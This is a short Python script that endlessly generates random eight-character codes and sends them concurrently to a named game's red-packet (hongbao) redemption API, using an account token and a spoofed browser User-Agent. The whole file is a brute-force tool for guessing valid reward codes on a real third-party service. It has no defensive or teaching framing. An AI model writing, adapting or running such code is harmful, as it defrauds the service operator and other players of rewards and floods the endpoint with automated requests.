import requests
import random
import string
from concurrent.futures import ProcessPoolExecutor

def generate_random_code(length):
    code = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
    return code

def send_request(code):
    url = "https://wea.vespa.games/api/hongbao/hongbao_detail"
    headers = {
        'Token': 'ur token',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }

    payload = {
        'code': code
    }

    response = requests.post(url, data=payload, headers=headers)
    print(f"Code: {code}\n{response.text}\n")

code_length = 8
num_requests = 5  # Number of concurrent requests to send

if __name__ == '__main__':
    with ProcessPoolExecutor() as executor:
        while True:
            random_codes = [generate_random_code(code_length) for _ in range(num_requests)]
            executor.map(send_request, random_codes)
